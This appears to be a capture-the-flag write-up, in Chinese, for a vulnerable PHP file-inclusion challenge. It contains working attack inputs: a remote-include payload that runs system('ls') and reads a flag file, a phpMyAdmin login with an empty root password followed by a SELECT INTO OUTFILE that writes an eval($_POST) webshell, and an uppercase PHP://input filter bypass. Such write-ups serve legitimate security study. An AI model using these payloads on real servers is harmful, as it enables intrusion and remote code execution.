## 题目

    
    
    <?php
    show_source(__FILE__);
    echo $_GET['hello'];
    $page=$_GET['page'];
    while (strstr($page, "php://")) {
        $page=str_replace("php://", "", $page);
    }
    include($page);
    ?>
    

## hello传值

    
    
    ?page=http://127.0.0.1/?hello=<?php%system("ls");?>
    ?page=http://127.0.0.1/?hello=<?php%show_source("fl4gisisish3r3.php");?>
    

## phpmyadmin写马

> 路径扫描能找到phpmyadmin

![在这里插入图片描述](https://image.3001.net/images/20220825/1661435841_63077fc12738b33baecaf.png!small)

> 账号root 密码为空

==phpmyadmin变量secure_file_priv值为空，说明可以写入一句话木马==

    
    
    show variables like "secure_file_priv";
    

![在这里插入图片描述](https://image.3001.net/images/20220825/1661435841_63077fc1caf5bdfa2d1eb.png!small)

==传成功==

    
    
    select "<?php eval($_POST[1]); ?>"into outfile '/tmp/1.php'
    

![在这里插入图片描述](https://image.3001.net/images/20220825/1661435842_63077fc251b7e90556964.png!small)

==测试==

![在这里插入图片描述](https://image.3001.net/images/20220825/1661435843_63077fc31ea0c37ca5f0b.png!small)

## 大写绕过 PHP://input

==php://input== 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行

利用该方法，我们可以直接写入php文件，输入file=php://input，然后使用burp抓包，写入php代码：

    
    
    <?php system("ls");?>
    

![在这里插入图片描述](https://image.3001.net/images/20220825/1661435843_63077fc3da2387a0ccddf.png!small)

